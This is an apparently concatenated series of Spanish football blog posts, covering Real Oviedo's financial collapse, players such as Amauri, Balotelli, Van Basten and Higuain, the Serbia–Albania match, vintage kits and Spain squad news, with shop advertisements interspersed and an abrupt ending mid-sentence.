Por desgracia no tantos clubes cuentan con alguien con talentoso para enhebrar la aguja.Los de Oviedo fabricamos el nuestro para engarzar la electricidad en la delantera, la querencia yugoslava o el orgullo, valor y garra: un lema que se borda en la camiseta solo si lo aplicas antes en el campo. Por desgracia, el club vive al margen de su propia historia y tienen que ser iniciativas externas las que se encarguen de cocinar el relato del club para el resto de aficionados. Como la del libro ‘Un derbi solidario’ En el polo opuesto caminan equipos como el Athletic Club, genios ahí, o tipos como los de Sky, que se ha detenido en la historia del Schalke con un trabajo excelente. Han preguntado por el club a la peña de aficionados más vieja del fútbol alemán y el resultado es precioso.Palabras como Gelsenkirchen o Parkstadion le sonaba a chino al barbas de las New Balance. No sabía que Olaf Thon empujódesde las calderas en la UEFA del 97, pero acabamos charlando de storytelling. Desde que tengo uso de razón espero un momento con el Real Oviedo, aguardando el instante como un surfer en la zona maldita. Lo que nosotros vivimos, imagino que el simpatizante del infrafutbol comulga con ello, es una clase perversa de disfrute. Tan solo es soportar las embestidas malignas del mar, una y otra vez, hasta salir a flote. Aguardar ese momento en que agitas la cabeza salvajemente, vivo, para surfear un segundo y después, seguramente, volver a sumergirte. El sistema de ascensos reserva ese único premio al hincha humilde pero lo aceptamos y nos gusta. Al menos es sano. El problema es que el mar está plano para el Oviedo desde hace muchos años. No hay olas y lo que es peor, nadie con conocimiento ni valentía suficientes para surfear las que vienen. ¿Se lo digo en cristiano? El Oviedo, el histórico Real Oviedo, está ahora mismo braceando para evitar el descenso a Tercera División y con ello una muerte segura. Una vez más.Dice y bien el periodista Pedro Zuazua que el Oviedo es un cádaver. Yo discrepo. Pienso que es algo peor, es un zombi. Algo insano.Un muerto al menos es digno. Pasó a mejor vida y todos le honran. Es más, en el caso de que fuera buena persona, como es el caso que nos ocupa, los que lo velaban habrían encontrado cierto descanso al consumarse su final. Dejó de dar guerra para dar paz. No pasa lo mismo con el Real Oviedo. Parece un muerto viviente. Un cadáver al que Alberto González (máximo accionista) y sus complices le han trepanado el cerebro para controlarlo a su antojo. Y ahí va el viejo club, con la misma ropa de siempre pero vagando por la calle sin voluntad mientras se descompone a cada paso. Parece idéntico al que conocimos pero no lo es. Y se lo vuelvo a decir en cristiano, el Real Oviedo está a un pasito de desaparecer. Si los que lo velamos no reaccionamos lo siguiente que haremos será leer la esquela en el periódico.El Oviedo arrastra una contabilidad caótica desde la época de bonanza ecónomica que barnizó el fútbol español con litros de dinero catódico. Un rosario de incapaces, que se remonta a la época de Eugenio Prieto, gastaron lo que no tenían. Quisieron ser grandes, reivindicarse sin venir a cuento. Hicieron y deshicieron en su propio beneficio hasta despedazar la entidad. Al Oviedo lo bajaron a Segunda, a Segunda B y Tercera rompiendo a jirones por el camino la conexión entre la gente y su equipo. No les importó ni les importa. Los sucesivos dirigentes del Oviedo se han esforzado tanto en devaluarlo, domingo tras domingo, acción tras acción, sentencia tras sentencia, que no sorprende la ruina actual. En diez años ha habido alguna alegría menor, algún jugador con casta y tímidos arranques de orgullo. Poco más. Esto se muere y si no lo ha hecho antes es porque al muerto lo arropa una afición con la  lealtad a prueba de bombas. ¿Quieren saber las últimas noticias? Comienzo por lo deportivo. El Real Oviedo arrancó esta temporada, la siguiente tras el calamitoso fracaso en la fase de ascenso anterior, con el objetivo de ganar su categoría. Con la ficticia meta de ser el mejor del grupo II de la tercera categoría del fútbol español. Nos vendieron que habían comprado las piezas adecuadas para acometer la aventura con garantías, se prometió el oro y el moro. ¿Saben el resultado? El equipo pena en la esquina más mugrienta del infrafutbol español a punto de regresar a los barrizales.Cosa que no sorprende teniendo en cuenta que hasta el último despacho del club supura incompetencia por las junturas. ¿Y en lo institucional? El club acaba de perder un litigio contra el Principado de Asturias por cuantía de 2 millones de euros en concepto de patrocinio. Dos millones que, oh casualidad, no eran suyos y a los que la necia clase dirigente que maneja la caja azul fiaba el futuro de los dos próximos años. Bizarro, vergonzoso y Real Oviedo. Siempre en la misma frase.En el club carbayón se da una curiosa circunstancia. Es un muerto al que todos velan pero nadie asiste. Los dueños han demostrado con creces su incapacidad profesional y su baja catadura moral destrozando al club de arriba a abajo, el mercenario Ayuntamiento de Oviedo (aun cuando es ciertamente reprobable su participación con dinero de todos los ovetenses en una empresa privada) continúa haciendo dejación de sus responsabilidades y los jugadores demuestran cada domingo un interés nulo en luchar contra sus propias limitaciones. Una vez más solo queda la grada. Hay que unirse y seguir apretando. En 2003 salimos a la calle para reclamar que solo había un Oviedo posible y que era de los oviedistas, ahora debemos hacer lo mismo con más fuerza si cabe. El Oviedo vive en proceso acelerado de putrefacción y si la afición no le tiende la última mano pasará a mejor vida. Es triste pero es así. Despertemos y no lo permitamos. A Amauri, que es un delantero competente pero siempre ha vivido acechado por las comparaciones con los auténticos killers, le cerraron la puerta en Casa Juve y tuvo que hacer la maleta vía Parma. Ni el más listo se lo esperaba pero allí y cuando las patatas quemaban sacó lo mejor de sí mismo. El tibio se volvió prolijo y con siete goles en tan solo once partidos se echó a los queseros a hombros y les sacó del cadalso. Rindió. Ahora, con esa tarjeta en el bolsillo Amauri está emperrado en volver al blanquinegro y con tal idea en mente se ha tirado el verano sin atender al timbre. Rechazó al Galatasaray, al Palermo al Génova, al propio Parma e incluso al Marsella del que sigue siendo su principal valedor, Didier Deschamps. Piensa que se lo merece pero en Turín no le han guardado la silla.No hace mucho Amauri era el cromo de moda en el calcio e incluso el seleccionador nacional, Lippi, le tenía en cartera como ariete de referencia. Con mucha algarabía y debate estaba incluso por delante de los auténticos italianos. La cosa iba tan de perlas que en 2008 Amauri chocó palmas con la Juve y se aseguró cobrar tres millones y medio de euros al año. Cuatro temporadas después, con la crisis económica como decadente telón de fondo, a Amauri no le ha servido de nada ser uno de los arietes con mejor promedio del último campeonato. El contrato de su vida, esos tres kilos y medio de ficha que le iban a retirar efectivamente le han retirado. Perdió su sitio en la Juve y equipos como el Parma, donde seguramente está su hábitat,  tampoco pueden hacerse cargo de su ficha.Me canta la Wikipedia que uno de los significados de la palabra Carapicuíba en guaraní es “pez que no se puede comer”. En Carapicuíba, cerca de Sao Paulo, nació Amauri. Italia, Inglaterra, la anomalía y el Manchester City. Si me dieran un euro por cada vez que he tirado de las susodichas etiquetas a lo largo de tres años de escritura en Diarios de Fútbol…“Oooooo Balotelli, he’s a striker, he’s good at darts, an allergy to grass but when he plays he’s fuckin class, he drives around moss side with a wallet full of cash!” Hace más o menos un año, un autobus público cargadito hasta los topes de ingleses mostrencos alumbraba el candidato principal a convertirse en cántico del año. Simpático el bufón de Balotelli. El peto rebelde, los desplantes al mundo, un mohicano, el iPad y toda la pesca. En esas estaba SuperMario entonces. Fuera de cualquier foco que tuviera que ver con lo estrictamente futbolístico. Un año más tarde, el guión ha mutado y Balotelli es por fin un cromo valioso en el álbum celeste.De chilena a la remanguillé (ante la pasividad de un Aston Villa que huele a derribo, todo sea dicho) el astro barriobajero se presentó a la cita con el gol por cuarta ocasión en cuatro partidos. Desvirgó el marcador ante Everton y Villa y contribuyó a encarrilar las victorias ante el Blackburn Rovers en liga y Birmingham en Copa de la Liga. Su aportación trascedente en la captura de nueve puntos y una eliminatoria demuestran que el italiano ya cuenta. Que lo suyo no son efectos especiales. Ese mohicano imposible que sigue echando chispas en determinados momentos (el sábado se encaró con la grada rival al celebrar su gol) corona un cerebro brillante para lo futbolístico. Lo intuíamos y ahora lo sabemos.En un gesto de responsabilidad, de madurez inusitada, Balotelli ha aparecido cuando el equipo le ha dado un silbidito. Mancini ya se frota las manos y lo da por recuperado pero queda lo gordo y será ahí, cuando las patatas quemen, mañana mismo en el alambre frente al Villarreal, el momento en que podamos valorar en su justa medida la resurrección del talento italiano. Seguramente será misión imposible que acabe la temporada sin despachar algún que otro enredo marca de la casa pero al menos ahora apunta a algo bueno. Mejor tarde que nunca. 1981 fue un año de mierda en Norwich para los que les gustaba el fútbol. La parroquia canaria vió como el equipo empaquetaba la maleta de vuelta a segunda tan sólo un año después de ascender. Y lo que es peor, a los del Ipswich la cosa les iba de perlas. Con el cachondo de Bobby Robson pintando la pizarra se las agenciaron para ganar la Copa de Liga y no ganaron el campeonato de puro milagro. Gracias a Dios allí estuvo el Aston Villa para hacer un poco menos desgraciada a la canariada.Una vieja maniobra, la de emjugar las lágrimas en un nuevo trapito, para renovar las ilusiones perdidas. No hemos terminado de quitarnos la zamarra actual y ya se nos ha quedado vieja.La nueva equipación recupera una línea de aire muy clásico, con la única licencia de la inclusión de la ya habitual senyera en la parte frontal del cuello, que tiene pinta de que va a ser muy bien recibida por los aficionados. Adiós a los degradados, a las líneas difuminadas, a los delirios de diseño y a las estridencias recientes. Dos franjas azules y tres granas. Rectas, firmes, identificables. Son tan representativos e identitarios los colores azul y grana que no necesitan de requiebros estilísticos. Son los colores del Barça, como lo fueron con la mítica Meyba y como lo eran en los años noventa con la italiana Kappa. ¿Eres un nostálgico? ¿Añoras las camisetas sin publicidad en el pecho, en la espalda y hasta en su reverso? ¿Por qué conformarte con una camiseta que pretende ser clásica imitando aquellos viejos y celebrados diseños pudiendo llevar una camiseta realmente clásica? En Classic Football Shirts tienen un completísimo muestrario de camisetas del FC Barcelona, desde los años ochenta hasta la actualidad. El comentario surgió en el mismo momento en que UEFA dio a conocer el resultado del sorteo de grupos de la liguilla clasificatoria para la Eurocopa del año 2016 a celebrar en Francia. Si el organismo que dirige los designios del fútbol europeo había decidido, quizá en un exceso de celo o una especie de arrepentimiento de última hora, que un posible enfrentamiento entre España y Gibraltar era una fuente latente de previsible conflicto político y había optado por dirigir el sorteo para impedir un enfrentamiento entre ambos combinados, resultaba a todas luces incomprensible que a esa misma cabeza pensante se le hubiese pasado por alto que quizá no era una idea demasiado brillante el encuadrar a Serbia y Albania, bien juntitas y bien revueltas, en el Grupo I de la liguilla de clasificación.Analizar aquí los pormenores y los recovecos de las turbulentas relaciones socio-políticas entre Serbia y Albania nos convalidaría alguna que otra asignatura de la licenciatura en Historia. No soy historiador ni un experto en política balcánica y estoy seguro de que al lector no le será complicado encontrar sitios en los que leer más y mejor sobre el conflicto que lleva más de un siglo enfrentando a dos pueblos tan próximos y, a la vez, tan distantes. Por pura aproximación al contexto, diremos que ambos países dirimen una disputa eterna con la región de Kosovo como fondo del asunto. Kosovo, territorio fronterizo con ambos países y con una superficie similar a la de la Región de Murcia, aglutina entre sus fronteras un conglomerado político-social que es fiel reflejo miniaturizado del batiburrillo que acoge la zona de los Balcanes desde tiempos inmemoriales. Con mayoría de población de etnia albanesa y una minoría de etnia serbia en la zona norte (la fronteriza con Serbia), Kosovo declaró su independencia y soberanía en el año 2008, con el apoyo de aproximadamente la mitad de los países miembros de la ONU. Entre aquellos que no reconocen dicha independencia se encuentra, cómo no, Serbia, que reclama el autoproclamado estado kosovar como una provincia más dentro de su territorio y se niega a admitir la existencia de una República de Kosovo independiente de Belgrado. El dron dirigido por el hermano del primer ministro de Albania desde el palco, la bandera con la imagen del territorio de la llamada ‘Gran Albania’ (incluyendo la región kosovar como territorio histórico de Albania) y las efigies de dos referencias del nacionalismo albanés como Ismail Qemali, fundador del estado de Albania en 1912, e Isa Boletini, activo guerrillero conocido como ‘el león de Kosovo’ y protagonista de cruentos enfrentamientos con el enemigo serbio, unidos a la posterior inclasificable pelea sobre el césped de Belgrado con la consiguiente suspensión del partido son mero folklore, casi extraído de uno de esos desaforados y pintorescos filmes de Emir Kusturica. Pura escenografía ad hoc para un conflicto vivo y en permanente agitación, al que se le sirvió el fútbol en bandeja como elemento ideal de difusión.Y con estos delicadísimos antecedentes, la siempre dispuesta y solícita UEFA decide que un doble enfrentamiento Serbia-Albania no merece un miramiento especial (cuando sí lo merece, por lo ya comentado, un España-Gibraltar). Porque cuesta creer que el asunto se haya ido de las manos por puro desconocimiento. Cuesta creer que no circulen en la sede del máximo organismo del fútbol europeo varias decenas de especializadísimos y sesudos informes sobre el conflicto entre ambas naciones y su extrapolación al mundo del fútbol. De hecho, la propia UEFA había vetado el desplazamiento de aficionados albaneses hasta Belgrado, en previsión de posibles enfrentamientos con la hinchada local, por lo que no era desconocedora del evidente riesgo. Por eso la lógica te lleva a concluir que lo suyo es una simple cuestión de indulgencia. Porque el conflicto entre Serbia y Albania, y dada la particular idiosincrasia de ambas nacionalidades, queda muy lejos de ser una rivalidad deportiva al uso y de ceñirse a un partido de fútbol con la preventiva pero insuficiente calificación de ‘alto riesgo’ por parte de los altos mandatarios uefos. No se trata de gritar desde la grada el intimidante ‘Kosovo je Srbija! ‘ (‘Kosovo es Serbia‘). Lo suyo va más allá, bastante más allá. Va lo suficientemente lejos como para presuponer que un partido de fútbol entre ambas selecciones tiene todas las papeletas para acabar convertido en una guerra identitaria alimentada por el fortísimo sentimiento nacionalista y antagónico de unos y de otros. Porque responsables y causantes son tanto unos, por instigar y tirar una cerilla colgada de un dron en un bidón de gasolina que estaba deseando el más mínimo chispazo para saltar por los aires, como los otros, por responder, al menos una destacada parte de la afición, de una manera desproporcionadamente violenta e indigna de tener cabida en el seno de cualquier manifestación deportiva. La gran bola de fuego aterriza ahora en Nyon. Esperando a ser sofocada por quienes no debieron de permitir jamás que llegara a prender. Marco van Basten es un recuerdo lejano enmarcado entre la nieve del UHF de una pequeña televisión Thomson en blanco y negro y con antena de cuernos. Es un testimonio, de cuando el fútbol no era un placer compartido sino que se disfrutaba escondidamente y en la intimidad, que se empeña en aferrarse a mi memoria a fuerza de aparecer repetidamente en imágenes, en leyendas y en escritos. De Marco van Basten se habla siempre en un pasado difuso, perdido, casi mitológico. Sí, pasó, alguna vez, aunque nunca se sabe muy bien cuándo. Porque su paso fue fugaz, efímero e interruptus y ocurrió en aquella época en la que el fútbol internacional se jugaba más en el estadio de la imaginación de cada uno que en la realidad palpable y visible.Van Basten se convirtió en pretérito perfecto demasiado pronto. Su retirada a los treinta años, después de cerca de tres temporadas envuelto en una espiral demoledora de lesiones, quirófanos, recaídas y achaques en sus frágiles tobillos de bailarina, rompió de forma abrupta con una carrera que acabó mitificada por la nostalgia que siempre provoca la definitiva rendición de un futbolista con tratamiento mayestático. Aquellos tobillos de porcelana de Sèvres no estaban preparados para soportar cerca de metro noventa de contundencia rematadora. Con la noticia de su extrema fragilidad, se convirtieron en presa fácil, en objetivo de defensores hartos de verse sometidos al transitar parsimonioso y regio del cisne de Utrecht. De él dijo en cierta ocasión Santi Segurola que ‘cabeceaba como un inglés, tocaba la pelota como un argentino y su regate, en largo o en corto, tenía el aroma exquisito de su maestro, Johan Cruyff‘. Porque la carrera de van Basten siempre tuvo una permanente referencia explícita a la del genio de Ámsterdam. Su mano fue la que protocolariamente chocó cuando pisó el césped por primera vez como profesional en un Ajax – NEC Nimega en el que salió como sustituto del maestro y ya bajo la batuta técnica del propio Johan, para despuntar en De Meer y dar el salto al fútbol italiano con tan solo veintitrés años y ya como Bota de Oro europea. De aquella, Berlusconi aún se encaprichaba de talentosos futbolistas y no de jovencitas esculturales.Seis intervenciones quirúrgicas en siete temporadas. Tobillos, clavícula, rodillas y un cuerpo remachado por todos sus rincones que a duras penas resistía ya los envites del impetuoso fútbol transalpino. Su final fue impropio de una leyenda viva.Así estaban las cosas cuando cuatro hinchas del Norwich decidieron que aquel momento tan asqueroso era el mejor para formar una banda. Y a la vera de Carrow Road nacieron los Serious Drinking, para probar que se puede cantar al fútbol, las mujeres y la ingesta masiva de alcohol con un poco más de gracia que Julito Iglesias. Me gustan las mujeres, me gusta el vino. Y el amor teenager en la grada. Quiero comenzar una nueva entrega de la sección del horror agradeciendo a mi camello particular, a ese Huggy Bear de las camisolas vomitivas que es el cafetero Martín Díaz. Dealer de raza, nunca falla el tiro y ha vuelto a tocar a mi puerta con la mejor basura. Con perdón de las damas, camiseta suplente del Club Atlético San Lorenzo de Almagro. No me importa cual fue la temporada en que los chavales del Cuervo se pasaron un año carnavaleando con ésta telucha estrellada, ni tampoco quienes de aquellos tuvieron que soportar el duro trance. Tan sólo pienso en diseños para cajas de cereales, en fiesta de pijamas, en Bertín Osborne emergiendo de entre el aguacero estelar y en que seguro que alguna emo idiota adscrita a esa absurda moda de tatuarse estrellitas soñadoras por el lomo me pagaría un saco de euros por esta joya. Una pena tener sólo la fotografíaDecía el Bambino Veira, ídolo eterno del Nuevo Gasómetro por la evidencia futbolística y a escala global por razones intelectuales que entenderán en el mismo momento en tecleen su nombre en Google, que el estadio de San Lorenzo es el lugar donde nace el viento. Y el tipo no lo decía por mitología vendehumista, tipo Carl Lewis, sino porque el Nuevo Gasometro es de esos campos, recuerden Zorrilla, donde siempre corre un aire que te hiela hasta el pensamiento. Bien yo creo firmemente que ésta camiseta se tejió el mismo día en el que el Bamba parió la ocurrencia. Que la elástica original era rayada en azulgrana como Dios manda hasta que apareció una ráfaga traicionera por detrás de una platea y término de descontrolar el atuendo. De otra manera no me explico que hacen ahí esas estrellas. Aparte de deshonrar la historia de CASLA.Eso si, en descargo de todo y todos, he de decir que la República Argentina es un país con una importante querencia a la aberración para los asuntos de patrón y aguja aplicados al balompié. Del club más grande al más pequeño, de Boca al Club Atlético Defensores del Ferocarril de Vía Estrecha, todos han caído alguna vez en la horripilancia. Es cierto que la cosa no llega al nivel de los alemanes, ay los alemanes, pero les disputan el título hasta la última jornada. Otro atenuante a la barrabasada es que el fabricante, recuerden los legendarios media luna, es famoso mundialmente por fabricar guantes de portero, con lo cual todo lo suyo siempre va a tender por propias necesidades de mercado, más a la extravagancia que al fútbol digno. La mejor manera de mirar hoy en día la Bundesliga es a pantalla partida. A un lado el Bayern y a otro el Mainz. La catastrófica versión 2010 del tradicionalmente robusto producto que es el Bayern Munich volvió a dejarse los tres puntos por el cámino. De nuevo, en esta ocasión ante el renacido Borussia Dortmund, y camina con paso firme hacia el desastre. La apisonadora se oxida en el páramo de la tabla y tan sólo ha sido capaz de conseguir ocho puntos de 21 posibles. A 13 del primer puesto. La lesión del por otra parte cada vez más inocuo Ribery, los bandazos constantes en la pizarra, una defensa de algodón y el peor ataque de la liga (tan sólo cinco goles en siete jornadas) tan sólo le están sirviendo a la maravilla germana, a una plantilla de ensueño, para firmar el peor comienzo de campeonato en toda su historia.Seguramente remontarán como casi siempre pero tal es el panorama que quien más y quien menos ha decidido poner las grabadoras a funcionar para justificar el sueldo. Alguno como Van Bommel han apelado a la testiculina, otros como el director deportivo Christian Nerlinger a la poesía (“Ya va siendo hora de dejar aparte la cálida manta del amor al prójimo”) y muchos ya empiezan a lamentarse por la falta de refuerzos veraniegos. En cambio los que mandan se han puesto directamente muy alemanes. El presidente Karl-Heinz Rummenigge ha descrito la actualidad del club con un no por escatológico menos ajustado a la realidad “estamos atascados en la mierda” y Louis Van Gaal, el hombre que no conoce la palabra piedad, ha prohibido a la plantilla acudir a la tradicional cogorza consentida en la Oktoberfest. ¡Noooo! se escuchó, desgarrador bramido, en el vestuario del Allianz Arena. Como ven los días están preciosos para ser jugador del Bayern…En el otro trozo de pantalla partida vemos a los seguidores del Mainz flotando sobre la carcajada. Suman siete partidos ganados de siete (sonoro 4-2 al Hoffenheim incluido en la última jornada) y con 21 puntazos mandan con mano firme en el campeonato. Sin duda son los primeros en celebrar una Bundesliga tan rica en alternativas como la de este año. Y tan sólo hace seis temporadas que levantaron la tapa de la alcantarilla y respiraron por primera vez el aire del mundo real. Dicen que es tal el ambientazo que se respira en el coqueto Bruchweg y la buena ola sobre la que surfea el equipo que Thomas Tuchel, el joven entrenador del milagro, trepó la valla y se subió a celebrar con los hinchas, megáfono en mano, tras la goleada al Hoffenheim. El caso es que, aparte del apestoso lugar común que señala al espectáculo como principal beneficiario de las sorpresas clasificatorias, el que debe de estar tocando palmes es Joachim Löw. Tendrá un estadio más a donde acercarse a ver buen fútbol y podrá añadir al espléndido ramillete de jóvenes que componen la selección nacional un par de cromos más como el delantero André Schürrle (20) o el medio Lewis Holtby (19). Maldita la falta que hacía pero me he levantado con ganas de aportar mi granito de arena a uno de los debates más idiotas que se recuerdan. ¿Higuain o Benzema? Pero ya que vamos a hablar de naderías un sábado por la mañana al menos hagámoslo con música … Ordenando la estantería me topé está mañana con un fanzine antiguo en el que entrevistaban a Lidia Damunt. Ella era la guitarrista de Hello Cuca, uno de mis grupos favoritos. Entre retazos sobre el disco que entonces acababa de alumbrar en solitario, Lidia confesaba que decidió aprender a tocar la guitarra después de escuchar a Bikini Kill, excitada con la posibilidad de crear música con pocos acordes y mucha mala baba.Leía a Lidia Damunt y me dio por  pensar en que mis gustos futbolísticos y musicales viven en barrios distantes. Me gusta el punk simple y coreable pero no aguanto a los bregadores. Me aburre soberanamente  el rollo guitar-hero pero alucino con un regate enrevesado de Kanu o las maniobras imposibles de Antonio Cassano al sol de las tres y media.Rebusqué entre mis discos y puse algo de Hello Cuca. Entonces con el cerebro flotando en una sopa de tropezones como punk, chatarra, rockabilly o auténtico, apareció la cabeza de Gonzalo Higuain, el grande y letal Pipita, y me tocó avergonzarme de mi mismo porque Higuain es como Lidia Damunt. El Pipa maneja dos o tres acordes, se ha empollado poco más que los rudimentos, pero los ejecuta con una gracia que se acerca a la perfección.Vamos a muerte con el Hellas Verona pero pierden 4-1. Ella ya ha terminado los linguine ai gamberoni que ha pedido.En la 2001/2002, mientras Madrid y Bayer se jugaban la Champions, el Hellas descendía a la Serie B. En ese equipo estaban Paolo Cannavaro, Camoranesi, Oddo, Dossena, Gilardino y Mutu. Los infiernos en el fútbol son estacionales. Todo pasa. Ahora están luchando de nuevo por no descender. Rafael Márquez, con 36 años, y Luca Toni, con 38; son las estrellas del equipo. “Estos van a tener complicado salvarse”, me escribe María. “¿Tan malos son?” , le contesto.Pero dejamos el fútbol y terminamos hablando de Verona. De los Capuleto y los Montesco. Inventamos un viaje para el año que viene. Shakespeare supo plasmar perfectamente lo gilipollas que nos volvemos los humanos por amor. Eso pienso mientras le escribo a María entre corazoncitos del Whatsapp y muñecos amarillos sonrosados. Quizá el año que viene me compre una camiseta del Hellas allí. Son bonitas. “¿Hay equipos en España que vistan con rayas amarillas y azules? , me pregunta. “Se lo preguntaré a los de Diarios de Fútbol”, contesto. Puedes comprar camisetas del Hellas Verona y de la Sampdoria en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Dice Gary Neville que “el mercado de invierno es una pérdida de tiempo”. Si miro una foto de Heldon Ramos, no tengo más remedio que darle la razón. Fichar tras las navidades es idéntico a ir al gimnasio: no quieras hacer en un mes lo que no has hecho durante todo el año. Imagino a los agentes de futbolistas como a gitanas en el mercadillo de Gran Vía Parque, voceando a los pobres clubes a los que la temporada se les está haciendo demasiado larga. Mucho saldo, mucha copia desafortunada y mucha braga barata.En los traspasos a veces ganan los clubes, otras veces los jugadores y casi siempre los representantes. El miedo es entendible a cinco días del cierre de ventanillas, sobre todo si tu equipo araña la roca evitando el descenso. Si estás arriba -como el Córdoba- es que, más o menos, las cosas funcionan. Para esos casos el mercado invernal es un fondo de pensiones por si la temporada se tuerce y hay que dar minutos a los no habituales.El Córdoba no tiene la apremiante necesidad que tenía la temporada pasada, cuando Bebé, Heldon, Zuculini y Edimar aterrizaron en la ciudad para evitar lo que resultó inevitable: el descenso a Segunda. Este año los refuerzos son como el maquillaje de una mujer guapa, como las camisetas entalladas de un calvo musculado, como dos dados colgando del espejo de un Ferrari: llamativos, pero prescindibles.El equipo ha demostrado ya dos cosas: que puede competir con lo que tiene, con altibajos como es comprensible, y que el papel de los canteranos puede ser algo más que testimonial. Abel Moreno ha demostrado solvencia en el lateral, Bijimine ya ha tenido sus minutos, y detrás esperan Sebas o Moha pidiendo sus oportunidades en el A.Si el equipo no logra mantenerse donde está ahora no será tanto por la falta de refuerzos sino por la bajada de intensidad de los que hay. Y ahí entra en juego la estrategia competitiva, el verdadero dardo para Presidente y Director Deportivo: los titulares sin competencia terminarán mermando su rendimiento a lo largo de la temporada. Para Florín, mirando a Pineda o De Tomas desde el banquillo, debe ser muy fácil ahorrarse una carrera. Igual que para Deivid, sin recambio natural en el equipo.Oltra sabe, porque tiene más tiros pegados ya que el Alcázar de Toledo, que sólo una plantilla nutrida y competitiva puede mantener el exigente ritmo de la Segunda División española.No era extraño que algún futbolista del club remarcase con cierta emoción la diferencia entre jugar en casa, donde las goleadas se sucedían sin piedad, y hacerlo a domicilio, con jugadores y afición rivales perfectamente conscientes de que quizá nunca vuelva a ser tan fácil vencer al gigante otrora todopoderoso.El hecho es que el video del Rangers se construía basándose en un partido que disputaron los locales en casa, y en el que vencían por 2-0 al Queen’s Park (no confundir con el QPR). Extrañamente, nadie realizó la mínima referencia al rival de los azules, no un grande, por supuesto, pero sí quizá uno de los equipos más peculiares del mundo. Merece la pena hablar un poco de ellos.Para empezar, son los dueños de Hampden Park, y con eso ya tendrían bastante para pasearse con la cabeza bien alta por cualquier sitio. A quien no conozca Hampden, que quizá sólo se inclina delante de Wembley en el Gotha de los templos del fútbol europeo, habría que decirle lo de Platón en la puerta de la Academia, pero mejor lo remitimos aquí, donde dedicamos unos párrafos a la mole venerable. Mucha gente cree que Hampden es un estadio nacional, sólo para partidos de la selección y grandes eventos -en esto hay razón, es la casa de los Scots– y por tanto no tiene equipo residente, en lo cual se equivocan: los Spiders inauguraron el primer Hampden en 1873, el segundo en 1884 y el tercero y definitivo, que aún se alza en pie, en 1903. Pero Queen’s Park no sólo ha sido desde siempre el dueño del más impresionante estadio de Escocia, sino que fueron, también, los reyes del paleofútbol. Desde que el club se fundó en 1867 en el barrio que le dio nombre, el equipo albinegro rigió con puño de hierro el destino del fúbol británico, y en cierto modo determinó la evolución del fútbol escocés. Los de Glasgow introdujeron el juego de pase en contraposición al dribling individualista y al pelotazo que acabaría caracterizando a sus vecinos, y fue esta escuela, y no la actual -véase Celtic-Barça del otro día- la que caracterizó durante muchos años el fútbol caledonio y lo llevó a sus mayores éxitos. El QP acumuló copas escocesas sin cuento -en particular las cuatro primeras cayeron de su lado- hasta el punto de que, habiendo ganado la última en 1893, es aún el tercero en el palmarés tras los dos grandes. Además, el club ostenta el extraño récord de ser el único club escocés en haber llegado dos veces a la final de la Copa Inglesa, antes de que se cerrara el acceso correspondiente. El Blackburn ejerció ambas ocasiones de Bestia Negra. ¿Por qué un club tan grande acabó hundido en la miseria actual? A diferencia de otros que fueron absorbidos involuntariamente por el tornado de la Historia, los dirigentes e hinchas del Queen’s Park eligieron su propio fin. Amparados en su divisa, Ludere causa ludendi, y adoptando actitud Gloria Swanson en Sunset Boulevard, decidieron que amateurs se habían fundado y amateurs morirían, así el profesionalismo lo inundara todo. Tan llamativa y gallarda resultó esta postura, que la Federación Escocesa les concedió durante varios años la gracia de permanecer en la máxima categoría aunque cayesen a puesto de descenso. Retirado el privilegio en 1922, el hundimiento no se hizo esperar.Su carrera deportiva se fundió definitivamente a negro un veintiseis de mayo del 93, en la angostura del área del viejo Olympiastadion muniqués. Ochenta y seis minutos de tristeza en la final de la Copa de Europa que Basile Boli arrebató al Milan con un vuelo imposible y un cabezazo rebosante de fe. Con la consabida infiltración manteniéndole a duras penas en pie sobre el césped. Incapaz de volver a ser el que fue y sustituido por un soldado raso como Stefano Eranio. Tenía apenas veintiocho años y la esperanza de, al menos, poder volver a vestir de corto. Pero jamás se volvió a escuchar el refinado y armonioso clac, clac, clac del aluminio de sus tacos. Nunca consiguió recuperarse y se quedó en eso, en un recuerdo vago, escondido en la lejanía de un personaje casi mitológico. Enganchando, quién sabe si fue real o solo un sueño, una volea imposible en la pequeña pantalla de aquel televisor en blanco y negro.Puedes encontrar camisetas del Ajax, del Milan, o la selección holandesa de Marco van Basten, en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Además, y hasta el próximo sábado 26 de julio a medianoche, disfruta de un 20% de descuento en todas tus compras. Código CFSSAVES20. Convocatoria muy esperada la anunciada hace unos minutos por Vicente del Bosque para enfrentarse a Francia, en partido amistoso en Saint-Denis, y Macedonia, en clasificatorio para la próxima Euro 2016. En primer lugar, por ser la primera tras el fracaso sin paliativos del pasado Mundial brasileño. En segundo, porque el adiós de varios de los clásicos del combinado nacional (Xavi, Xabi Alonso, Puyol…) y la acumulación de años de rendimiento empobrecido de otros (Torres, Villa, Piqué, Casillas, Arbeloa…) obligaba a una revolución profunda en el grupo de escogidos. Algo había que hacer.Por eso, esta nueva convocatoria tenía una relevancia especial. A priori, implica un cambio de ciclo necesario en un ambiente notablemente enrarecido tras la reciente experiencia mundialista. Y, como cualquier cambio de ciclo, como cualquier alteración del orden firme y establecido, resulta controvertida. No es lo mismo clamar a gritos por una revolución cuando el equipo aparece zarandeado por una teóricamente inferior selección de Chile, momento en el que casi cualquier medida parece insuficiente y en el que si por el aficionado medio fuese rodarían veinte cabezas, que ver la pretendida revolución plasmada sobre el papel. Por eso chirría, llegado el momento definitivo, comprobar que el cambio generacional lo encarnan nombres como el de Mikel San José, suplentísimo y discutido en el Athletic, Kiko Casilla, Marc Bartra o Paco Alcácer, porque quizá cuando se demandan cambios en el equipo nacional en realidad se hace en voz bajita.Algunos de los que han llegado se estabilizarán y se harán con un hueco en el plantel. Estoy pensando en Iturraspe, en Carvajal, en Isco o en Alcácer. Otros tal vez no aguanten la prueba del algodón y acaben desapareciendo de los planes de Del Bosque. Pero el cambio generacional era necesario y obligado. Porque los años pasan, porque las situaciones estables se intoxican y acaban viciadas y convertidas en marejada cuando uno menos se lo espera. Personalmente, esta nueva España me ilusiona, porque es casi como empezar de cero para pelear por un objetivo del que, al menos ahora sí, conocemos bien el sabor. Pese a que poco o nada tiene que ver con el suceso que en la Segunda Guerra Mundial enfrentó a navíos ingleses y alemanes lejos del escenario bélico principal de la lejana Europa, la Batalla del Río de la Plata, en su acepción estrictamente futbolística, vivirá un nuevo y vibrante episodio en el partido que enfrentará esta noche a Argentina y Uruguay en La Serena, en el marco del Grupo B de la Copa América que se disputa en tierras chilenas.Un enfrentamiento entre albicelestes y 